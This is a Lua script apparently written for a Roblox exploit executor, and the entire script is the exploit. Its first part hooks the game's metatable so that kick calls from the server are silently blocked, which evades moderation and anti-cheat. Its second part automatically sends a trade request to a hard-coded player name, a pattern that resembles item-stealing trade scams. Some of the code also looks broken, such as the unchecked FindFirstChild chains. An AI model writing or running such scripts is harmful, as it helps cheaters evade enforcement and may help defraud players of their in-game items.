-- ===== UPDATED ANTI-KICK SYSTEM =====
local function SecureAntiKick()
    -- Alternative metatable access method
    local success, mt = pcall(getrawmetatable, game)
    if not success then
        warn("Failed to access metatable directly - using backup method")
        mt = {}
        for k,v in pairs(getreg()) do
            if type(v) == "table" and rawget(v, "__mode") then
                mt = v
                break
            end
        end
    end

    -- Backup original functions
    local original = {
        namecall = mt.__namecall,
        index = mt.__index
    }

    -- Create new protected functions
    local protectedNamecall = function(self, ...)
        local method = getnamecallmethod()
        if method and tostring(method):lower() == "kick" then
            warn("[BLOCKED] Kick attempt stopped")
            return nil
        end
        return original.namecall(self, ...)
    end

    local protectedIndex = function(self, key)
        if tostring(key):lower() == "kick" then
            return function() 
                warn("[BLOCKED] Property kick attempt")
                return nil 
            end
        end
        return original.index(self, key)
    end

    -- Apply hooks without modifying metatable directly
    debug.setmetatable(game, {
        __namecall = protectedNamecall,
        __index = protectedIndex,
        __metatable = "Locked"
    })
end

-- ===== TRADE SYSTEM =====
local function SendTradeRequest(targetName)
    -- Wait for game to fully load
    repeat task.wait() until game:IsLoaded()

    -- Find target player
    local target = game.Players:FindFirstChild(targetName)
    if not target then
        warn("Target player not found")
        return false
    end

    -- Find trade remote (multiple possible names)
    local tradeRemote = game.ReplicatedStorage:FindFirstChild("Trade"):FindFirstChild("SendRequest")
                 or game.ReplicatedStorage:FindFirstChild("Trade"):FindFirstChild("RequestTrade")
                 or game.ReplicatedStorage:FindFirstChild("Trade"):FindFirstChild("InviteToTrade")

    if not tradeRemote then
        warn("Trade remote not found")
        return false
    end

    -- Send trade
    local success, err = pcall(function()
        if tradeRemote:IsA("RemoteFunction") then
            tradeRemote:InvokeServer(target)
        else
            tradeRemote:FireServer(target)
        end
    end)

    if not success then
        warn("Trade failed:", err)
    end
    return success
end

-- ===== INITIALIZATION =====
task.spawn(function()
    SecureAntiKick()  -- Activate protection
    task.wait(5)      -- Wait before trading
    SendTradeRequest("Apayps") -- Change target name
end)

print("System loaded successfully")
